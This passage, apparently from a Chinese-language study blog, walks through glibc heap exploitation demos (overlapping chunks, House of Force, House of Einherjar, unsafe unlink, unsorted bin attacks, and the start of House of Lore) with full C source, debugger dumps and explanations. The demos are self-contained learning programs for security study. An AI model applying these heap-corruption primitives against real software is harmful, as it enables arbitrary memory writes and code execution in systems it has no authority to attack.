prev_inused : 1                    
is_mmap : 0                    
non_mainarea : 0                     
fd : 0x7ffff7dd1b78                  
bk : 0x7ffff7dd1b78                  
</code></pre><p>修改p2的size字段</p>
<pre><code>0x602100 PREV_INUSE {
  prev_size = 0x3131313131313131, 
  size = 0x181, 
  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, 
  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, 
  fd_nextsize = 0x3232323232323232, 
  bk_nextsize = 0x3232323232323232
}
</code></pre><p>通过p2修改p3的内容，输出结果</p>
<pre><code>☁  glibc_2.25 [master] ⚡  ./overlapping_chunks 

This is a simple chunks overlapping problem

Let&#39;s start to allocate 3 chunks on the heap
The 3 chunks have been allocated here:
p1=0x9af010
p2=0x9af110
p3=0x9af210

p4 has been allocated at 0x9af110 and ends at 0x9af288
Let&#39;s run through an example. Right now, we have:
p4 = xۦ��
3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�

If we memset(p4, &#39;4&#39;, 376), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�
3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�

And if we then memset(p3, &#39;3&#39;, 80), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�
3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�

</code></pre><h4 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h4><p>源码：</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main(){

  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6,fake_size;
  int prev_in_use = 0x1;

  fprintf(stderr, &quot;\nThis is a simple chunks overlapping problem&quot;);
  fprintf(stderr, &quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;);
  fprintf(stderr, &quot;\nLet&#39;s start to allocate 5 chunks on the heap:&quot;);

  p1 = malloc(1000);//0x3e8  actually chunk_size ==&gt; 0x3f0
  p2 = malloc(1000);
  p3 = malloc(1000);
  p4 = malloc(1000);
  p5 = malloc(1000);

  real_size_p1 = malloc_usable_size(p1);
  real_size_p2 = malloc_usable_size(p2);
  real_size_p3 = malloc_usable_size(p3);
  real_size_p4 = malloc_usable_size(p4);
  real_size_p5 = malloc_usable_size(p5);

  fprintf(stderr, &quot;\n\nchunk p1 from %p to %p&quot;, p1, (unsigned char *)p1+malloc_usable_size(p1));
  fprintf(stderr, &quot;\nchunk p2 from %p to %p&quot;, p2,  (unsigned char *)p2+malloc_usable_size(p2));
  fprintf(stderr, &quot;\nchunk p3 from %p to %p&quot;, p3,  (unsigned char *)p3+malloc_usable_size(p3));
  fprintf(stderr, &quot;\nchunk p4 from %p to %p&quot;, p4, (unsigned char *)p4+malloc_usable_size(p4));
  fprintf(stderr, &quot;\nchunk p5 from %p to %p\n&quot;, p5,  (unsigned char *)p5+malloc_usable_size(p5));

  memset(p1,&#39;A&#39;,real_size_p1);
  memset(p2,&#39;B&#39;,real_size_p2);
  memset(p3,&#39;C&#39;,real_size_p3);
  memset(p4,&#39;D&#39;,real_size_p4);
  memset(p5,&#39;E&#39;,real_size_p5);

  fprintf(stderr, &quot;\nLet&#39;s free the chunk p4.\nIn this case this isn&#39;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;); 

  free(p4);

  fprintf(stderr, &quot;\nLet&#39;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;);
  fake_size = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2;
  fprintf(stderr,&quot;\n fake_size ==&gt; %x \n&quot;,fake_size);

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE 
  /*fake_size = real_size_p2 + real_size_p3 + prev_in_use + chunk_header_size*/

  fprintf(stderr, &quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;);
  fprintf(stderr, &quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;);
  free(p2);

  fprintf(stderr, &quot;\nNow let&#39;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;);

  p6 = malloc(2000);
  real_size_p6 = malloc_usable_size(p6);

  fprintf(stderr, &quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;);
  fprintf(stderr, &quot;\nchunk p6 from %p to %p&quot;, p6,  (unsigned char *)p6+real_size_p6);
  fprintf(stderr, &quot;\nchunk p3 from %p to %p\n&quot;, p3, (unsigned char *) p3+real_size_p3); 

  fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;);
  fprintf(stderr, &quot;%s\n&quot;,(char *)p3); 

  fprintf(stderr, &quot;\nLet&#39;s write something inside p6\n&quot;);
  memset(p6,&#39;F&#39;,1500);  

  fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;);
  fprintf(stderr, &quot;%s\n&quot;,(char *)p3); 


}
</code></pre>
<p>这个也是overlapping_chunk的例子，不过它造成overlapping是在free前完成的，也就是释放一个size字段被修改后的chunk，这个修改后的chunk会将它之后的chunk给包括进去。</p>
<p>修改p2的size字段，大小为real_size_p2 + real_size_p3 + prev_in_use + chunk_header_size</p>
<p>修改前：</p>
<p><img src="/picture/1552106658661.png" srcset="/img/loading.gif" alt="1552106658661"></p>
<p>修改后</p>
<p><img src="/picture/1552106686028.png" srcset="/img/loading.gif" alt="1552106686028"></p>
<p>将p2 释放掉,再申请一个大小为2000的chunk，就可以返回p2，通过p2就可以控制p3的内容了</p>
<p>运行结果</p>
<p><img src="/picture/1552106869103.png" srcset="/img/loading.gif" alt="1552106869103"></p>
<h4 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h4><p>源码</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;

int main(int argc , char* argv[])
{
    fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;);
    fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var);
    fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var);

    fprintf(stderr, &quot;\nLet&#39;s allocate the first chunk, taking space from the wilderness.\n&quot;);
    intptr_t *p1 = malloc(256);
    fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - sizeof(long)*2);

    fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;);
    int real_size = malloc_usable_size(p1);
    fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2);

    //----- VULNERABILITY ----
    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
    fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top);

    fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;);
    fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
    *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;// -1 ==&gt;0xffffffffffffffff
    fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
    //------------------------

    unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
    fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;
       &quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size);
    void *new_ptr = malloc(evil_size);

    void* ctr_chunk = malloc(100);
    fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;);
    fprintf(stderr, &quot;malloc(100) =&gt; %p!\n&quot;, ctr_chunk);
    fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;);

    fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var);
    fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;);
    strcpy(ctr_chunk, &quot;YEAH!!!&quot;);
    fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var);

}
</code></pre>
<p>house_of_force是一种针对top_chunk的攻击，需要满足两点条件：</p>
<ol>
<li>能控制top_chunk的size字段</li>
<li>能够自由的分配堆的大小</li>
</ol>
<p>原理：</p>
<pre><code>假设有一个溢出漏洞，可以改写 top chunk 的size字段，然后将其改为一个非常大的值，
以确保所有的 malloc 将使用 top chunk 分配，而不会调用 mmap。这时如果攻击者 
malloc 一个很大的数目（负有符号整数），top chunk 的位置加上这个大数，造成整
数溢出，结果是 top chunk 能够被转移到堆之前的内存地址（如程序的 .bss 
段、.data 段、GOT 表等），下次再执行 malloc 时，攻击者就能够控制转移之后地
址处的内存。
</code></pre><p>这个例子主要展示了通过top_chunk实现任意高地址的分配，首先将top_chunk的size字段修改为一个很大的值，这里直接修改为-1（32位下也就是0xffffffff，64位下就是0xffffffffffffffff），然后通过分配很大的内存，将top_chunk的地址抬高到我们想要控制的内存附近，然后再malloc就可以分配到想要控制的内存。</p>
<p>这里比较关键的是分配大小的计算 也就是evil_size的计算，计算方法如下</p>
<pre><code class="c">    /*
     * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
     * new_top = old_top + nb
     * nb = new_top - old_top
     * req + 2sizeof(long) = new_top - old_top
     * req = new_top - old_top - 2sizeof(long)
     * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
     * req = dest - old_top - 4*sizeof(long)
     */
</code></pre>
<p>简单的来说 evil_size = dest - top_chunk_add - size(chunk_header)</p>
<p>size(chunk_header)是chunk头的大小，32位时为0x10,64位时为0x20</p>
<p>简单调试下:</p>
<p>修改top_chunk的size字段</p>
<pre><code>pwndbg&gt; p ptr_top 
$2 = (intptr_t *) 0x603110
pwndbg&gt; x/10gx 0x603110
0x603110:    0x0000000000000000    0xffffffffffffffff
0x603120:    0x0000000000000000    0x0000000000000000
0x603130:    0x0000000000000000    0x0000000000000000
0x603140:    0x0000000000000000    0x0000000000000000
0x603150:    0x0000000000000000    0x0000000000000000
</code></pre><p>分配evil_chunk，将top_chunk地址抬高到 目标地址</p>
<p><code>`</code>pwndbg&gt; p &amp;bss_var<br>$5 = (char (*)[44]) 0x602060 &lt;bss_var&gt;<br>pwndbg&gt; top_chunk<br>0x602050 PREV_INUSE {<br>  prev_size = 0x0,<br>  size = 0x10b9,<br>  fd = 0x2073692073696854,<br>  bk = 0x676e697274732061,<br>  fd_nextsize = 0x6577207461687420,<br>  bk_nextsize = 0x6f7420746e617720<br>}</p>
<pre><code>
最后就可以分配到包含目标地址的chunk了

输出结果

![1552110821446](/picture/1552110821446.png)



#### House of Einherjar

源码：

```c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main()
{
    fprintf(stderr, &quot;Welcome to House of Einherjar!\n&quot;);
    fprintf(stderr, &quot;Tested in Ubuntu 16.04 64bit.\n&quot;);
    fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.\n&quot;);

    uint8_t* a;
    uint8_t* b;
    uint8_t* d;

    fprintf(stderr, &quot;\nWe allocate 0x38 bytes for &#39;a&#39;\n&quot;);
    a = (uint8_t*) malloc(0x38);
    fprintf(stderr, &quot;a: %p\n&quot;, a);

    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, &quot;Since we want to overflow &#39;a&#39;, we need the &#39;real&#39; size of &#39;a&#39; after rounding: %#x\n&quot;, real_a_size);

    // create a fake chunk
    fprintf(stderr, &quot;\nWe create a fake chunk wherever we want, in this case we&#39;ll create the chunk on the stack\n&quot;);
    fprintf(stderr, &quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;);
    fprintf(stderr, &quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;);
    fprintf(stderr, &quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;);

    size_t fake_chunk[6];

    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk&#39;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size
    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
    fake_chunk[2] = (size_t) fake_chunk; // fwd
    fake_chunk[3] = (size_t) fake_chunk; // bck
    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize


    fprintf(stderr, &quot;Our fake chunk at %p looks like:\n&quot;, fake_chunk);
    fprintf(stderr, &quot;prev_size (not used): %#lx\n&quot;, fake_chunk[0]);
    fprintf(stderr, &quot;size: %#lx\n&quot;, fake_chunk[1]);
    fprintf(stderr, &quot;fwd: %#lx\n&quot;, fake_chunk[2]);
    fprintf(stderr, &quot;bck: %#lx\n&quot;, fake_chunk[3]);
    fprintf(stderr, &quot;fwd_nextsize: %#lx\n&quot;, fake_chunk[4]);
    fprintf(stderr, &quot;bck_nextsize: %#lx\n&quot;, fake_chunk[5]);

    /* In this case it is easier if the chunk size attribute has a least significant byte with
     * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
     * the chunk includes the amount requested plus some amount required for the metadata. */
    b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);

    fprintf(stderr, &quot;\nWe allocate 0xf8 bytes for &#39;b&#39;.\n&quot;);
    fprintf(stderr, &quot;b: %p\n&quot;, b);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

    fprintf(stderr, &quot;\nb.size: %#lx\n&quot;, *b_size_ptr);
    fprintf(stderr, &quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;);
    fprintf(stderr, &quot;We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;\n&quot;);
    a[real_a_size] = 0; 
    fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr);
    fprintf(stderr, &quot;This is easiest if b.size is a multiple of 0x100 so you &quot;
           &quot;don&#39;t change the size of b, only its prev_inuse bit\n&quot;);
    fprintf(stderr, &quot;If it had been modified, we would need a fake chunk inside &quot;
           &quot;b where it will try to consolidate the next chunk\n&quot;);

    // Write a fake prev_size to the end of a
    fprintf(stderr, &quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;
           &quot;it will consolidate with our fake chunk\n&quot;, sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    fprintf(stderr, &quot;Our fake prev_size will be %p - %p = %#lx\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;

    //Change the fake chunk&#39;s size to reflect b&#39;s new prev_size
    fprintf(stderr, &quot;\nModify fake chunk&#39;s size to reflect b&#39;s new prev_size\n&quot;);
    fake_chunk[1] = fake_size;

    // free b and it will consolidate with our fake chunk
    fprintf(stderr, &quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;);
    free(b);
    fprintf(stderr, &quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;, fake_chunk[1]);
    fprintf(stderr, &quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;);
    d = malloc(0x200);
    fprintf(stderr, &quot;Next malloc(0x200) is at %p\n&quot;, d);
}
</code></pre><p>house_of_einherjar主要利用了free函数中的向后合并的操作的机制，可以通过malloc返回任意地址的chunk。</p>
<p>这个例子中，它在栈上伪造了一个fake_chunk，然后修改chunk_b的prev_size字段 以及 size字段的prev_inuse标志位。使prev_size = b - fake_chunk - sizeof(chunk_header)， prev_inuse为0。然后当free掉b时，它会向后合并，最后得到的chunk地址就会为fake_chunk，当再次malloc时，就可以分配到栈上的空间。</p>
<p>伪造的fake_chunk的size==&gt; b - fake_chunk - sizeof(chunk_header)</p>
<p>注意：</p>
<ul>
<li>伪造的fake_chunk中的 fd和bk指针要指向自己，用来bypass unlink</li>
<li>后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize))</li>
<li>相邻的chunk会共享prev_size字段，当低地址的chunk处于使用状态时，高地址的chunk的prev_size字段就可以被低地址的chunk使用，形成空间的复用，所以可能可以通过低地址的chunk修改高地址的chunk的prev_inuse标志位。</li>
</ul>
<p>调试一下：</p>
<p>伪造的fake_chunk</p>
<pre><code>pwndbg&gt; x/10gx &amp;fake_chunk 
0x7fffffffdd10:    0x0000000000000100    0xffff800000605330
0x7fffffffdd20:    0x00007fffffffdd10    0x00007fffffffdd10
0x7fffffffdd30:    0x00007fffffffdd10    0x00007fffffffdd10
0x7fffffffdd40:    0x00007fffffffde30    0x0e2957f6498f5000
0x7fffffffdd50:    0x0000000000400c00    0x00007ffff7a2d830
</code></pre><p>free掉b后，返回的chunk，可以发现fake_chunk的size字段增大了 b.size的大小</p>
<pre><code>pwndbg&gt; x/10gx &amp;fake_chunk 
0x7fffffffdd10:    0x0000000000000100    0xffff8000006262f1
0x7fffffffdd20:    0x00007fffffffdd10    0x00007fffffffdd10
0x7fffffffdd30:    0x00007fffffffdd10    0x00007fffffffdd10
0x7fffffffdd40:    0x00007fffffffde30    0x0e2957f6498f5000
0x7fffffffdd50:    0x0000000000400c00    0x00007ffff7a2d830
</code></pre><p>最后malloc便可以返回fake_chunk的内存</p>
<p>运行结果</p>
<p><img src="/picture/1552119505214.png" srcset="/img/loading.gif" alt="1552119505214"></p>
<h4 id="unsafe-unlink-1"><a href="#unsafe-unlink-1" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h4><p>这个我前面总结过了，这里就讲解一下这个例子</p>
<p>源码：</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

uint64_t *chunk0_ptr;

int main()
{
    fprintf(stderr, &quot;Welcome to unsafe unlink 2.0!\n&quot;);
    fprintf(stderr, &quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;);
    fprintf(stderr, &quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;);
    fprintf(stderr, &quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;);

    int malloc_size = 0x80; //we want to be big enough not to use fastbins
    int header_size = 2;

    fprintf(stderr, &quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;);

    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    fprintf(stderr, &quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;, &amp;chunk0_ptr, chunk0_ptr);
    fprintf(stderr, &quot;The victim chunk we are going to corrupt is at %p\n\n&quot;, chunk1_ptr);

    fprintf(stderr, &quot;We create a fake chunk inside chunk0.\n&quot;);
    fprintf(stderr, &quot;We setup the &#39;next_free_chunk&#39; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;);
    chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);
    fprintf(stderr, &quot;We setup the &#39;previous_free_chunk&#39; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;);
    fprintf(stderr, &quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;);
    chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);
    fprintf(stderr, &quot;Fake chunk fd: %p\n&quot;,(void*) chunk0_ptr[2]);
    fprintf(stderr, &quot;Fake chunk bk: %p\n\n&quot;,(void*) chunk0_ptr[3]);

    fprintf(stderr, &quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;);
    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    fprintf(stderr, &quot;We shrink the size of chunk0 (saved as &#39;previous_size&#39; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;);
    fprintf(stderr, &quot;It&#39;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;);
    chunk1_hdr[0] = malloc_size;
    fprintf(stderr, &quot;If we had &#39;normally&#39; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;,(void*)chunk1_hdr[0]);
    fprintf(stderr, &quot;We mark our fake chunk as free by setting &#39;previous_in_use&#39; of chunk1 as False.\n\n&quot;);
    chunk1_hdr[1] &amp;= ~1;

    fprintf(stderr, &quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;);

    free(chunk1_ptr);

    fprintf(stderr, &quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;);
    char victim_string[8];
    strcpy(victim_string,&quot;Hello!~&quot;);
    chunk0_ptr[3] = (uint64_t) victim_string;

    fprintf(stderr, &quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;);
    fprintf(stderr, &quot;Original value: %s\n&quot;,victim_string);
    chunk0_ptr[0] = 0x4141414142424242LL;
    fprintf(stderr, &quot;New Value: %s\n&quot;,victim_string);
}
</code></pre>
<p>在这个例子中它定义了一个全局指针来存储 chunk0的地址，chunk0 malloc的大小为0x80，分配这么大的目的是为了释放chunk0时不会被放入fastbin中。然后它分配了一个大小为0x80的chunk2，并且将chunk0的fd和bk伪造好</p>
<blockquote>
<p>fd ==&gt; (uint64_t) &amp;chunk0_ptr - (sizeof(uint64_t)*3)</p>
<p>bk==&gt; (uint64_t) &amp;chunk0_ptr - (sizeof(uint64_t)*2)</p>
</blockquote>
<p>将chunk1的prev_size字段设置为 chunk0的大小，同时将prev_inuse位设置为0，最后将chunk1 释放掉，就会触发unlink。</p>
<p>涉及的指针操作</p>
<pre><code>FD = chunk0_ptr - 0x18
BK  = chunk0_ptr- 0x10
unlink实际做了
*(chunk0_ptr - 0x18 + 0x18) = chunk0_ptr - 0x10
*(chunk0_ptr - 0x10 - 0x10) = chunk0_ptr - 0x18 #主要看这步
等价于
*chunk0_ptr = chunk0_ptr - 0x18
</code></pre><p>最后，原本存储着chunk0地址的指针chunk0_ptr，会指向chunk0_ptr - 0x18，这时候通过控制chunk0就可以实现任意地址写。此时chunk0_ptr-&gt;bk 正好指向 &amp;chunk0_ptr，修改chunk0_ptr-&gt;bk 为想要修改的地址，然后再通过chunk0_ptr往地址写入内容。 </p>
<p>最终输出</p>
<p><img src="/picture/1552132454710.png" srcset="/img/loading.gif" alt="1552132454710"></p>
<h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h4><p>源码：</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(){
    fprintf(stderr, &quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;);
    fprintf(stderr, &quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;
           &quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;);

    unsigned long stack_var=0;
    fprintf(stderr, &quot;Let&#39;s first look at the target we want to rewrite on stack:\n&quot;);
    fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;stack_var, stack_var);

    unsigned long *p=malloc(400);
    fprintf(stderr, &quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;,p);
    fprintf(stderr, &quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;
           &quot;the first one during the free()\n\n&quot;);
    malloc(500);

    free(p);
    fprintf(stderr, &quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;
           &quot;point to %p\n&quot;,(void*)p[1]);

    //------------VULNERABILITY-----------

    p[1]=(unsigned long)(&amp;stack_var-2);
    fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);
    fprintf(stderr, &quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;,(void*)p[1]);

    //------------------------------------

    malloc(400);
    fprintf(stderr, &quot;Let&#39;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;
           &quot;rewritten:\n&quot;);
    fprintf(stderr, &quot;%p: %p\n&quot;, &amp;stack_var, (void*)stack_var);
}
</code></pre>
<p>这个例子展示了unorted_bin_attack，将栈上的一个值修改为一个很大的无符号整型数。具体的原理是，从unsorted bin中取chunk出来时会往bck-fd出写入unsorted bin的地址，所以只要控制了unsorted bin中的bk，就可以实现向任意地址写如一个不可控的值</p>
<p>具体源码：</p>
<pre><code class="c">unsorted_chunks (av)-&gt;bk = bck;
bck-&gt;fd = unsorted_chunks (av);
</code></pre>
<p>往bk写入的地址是 想要修改的地址 - sizeof(chunk_header)</p>
<p>利用这漏洞可以实现的事情：</p>
<ol>
<li>修改 global_max_fast的大小，拓展fastbin attack的范围</li>
<li>修改循环的次数</li>
</ol>
<p>运行结果</p>
<p><img src="/picture/1552137711122.png" srcset="/img/loading.gif" alt="1552137711122"></p>
<h4 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h4><p>源码:</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;

int main() {
  intptr_t stack_buffer[4] = {0};

  fprintf(stderr, &quot;Allocating the victim chunk\n&quot;);
  intptr_t* victim = malloc(0x100);

  fprintf(stderr, &quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;);
  intptr_t* p1 = malloc(0x100);

  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;, victim);
  free(victim);

  fprintf(stderr, &quot;Create a fake chunk on the stack&quot;);
  fprintf(stderr, &quot;Set size for next allocation and the bk pointer to any writable address&quot;);
  stack_buffer[1] = 0x100 + 0x10;
  stack_buffer[3] = (intptr_t)stack_buffer;

  //------------VULNERABILITY-----------
  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;);
  fprintf(stderr, &quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;);
  victim[-1] = 32;
  victim[1] = (intptr_t)stack_buffer; // victim-&gt;bk is pointing to stack
  //------------------------------------

  fprintf(stderr, &quot;Now next malloc will return the region of our fake chunk: %p\n&quot;, &amp;stack_buffer[2]);
  fprintf(stderr, &quot;malloc(0x100): %p\n&quot;, malloc(0x100));
}
</code></pre>
<p>这个例子展示了怎么利用unsorted bin 的分配机制，返回一个在栈上伪造的chunk。因为unsorted bin是FIFO，新插入的chunk是插到表头，然后从表尾取chunk。将victim chunk的bk修改为fake_chunk，size字段修改为别的值，最后malloc相应的大小，就可以返回伪造的fake_chunk了。</p>
<p>需要满足的条件：</p>
<ol>
<li>可以控制unsorted bin 中victim chunk的size字段和bk字段</li>
<li>泄露出栈地址，并在栈上布置好fake_chunk</li>
<li>victim_chunk的大小应该满足不同于将要分配的大小以及 大于2*SIZE_SZ 和 小于av-&gt;system_mem</li>
</ol>
<p>运行结果：</p>
<p><img src="/picture/1552139175869.png" srcset="/img/loading.gif" alt="1552139175869"></p>
<h4 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h4><p>源码：</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

void jackpot(){ puts(&quot;Nice jump d00d&quot;); exit(0); }

int main(int argc, char * argv[]){

  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, &quot;\nWelcome to the House of Lore\n&quot;);
  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;);
  fprintf(stderr, &quot;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n&quot;);

  fprintf(stderr, &quot;Allocating the victim chunk\n&quot;);
  intptr_t *victim = malloc(100);
  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\n&quot;, victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

